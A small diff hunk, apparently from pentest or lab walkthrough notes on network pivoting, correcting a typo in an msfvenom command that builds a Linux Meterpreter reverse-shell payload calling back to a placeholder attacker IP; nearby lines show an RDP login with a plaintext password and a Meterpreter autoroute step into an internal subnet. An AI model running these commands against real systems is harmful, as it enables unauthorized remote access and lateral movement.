@@ -114,7 +114,7 @@ xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
 
 ```bash
 # 1. Obtain a Meterpreter session on the pivot host
-msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ATACK_IP> LPORT=8080 -f elf -o pivot.elf
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ATTACK_IP> LPORT=8080 -f elf -o pivot.elf
 
 # 2. Add routes to the internal network
 meterpreter > run post/multi/manage/autoroute SUBNET=172.16.5.0 SESSION=1
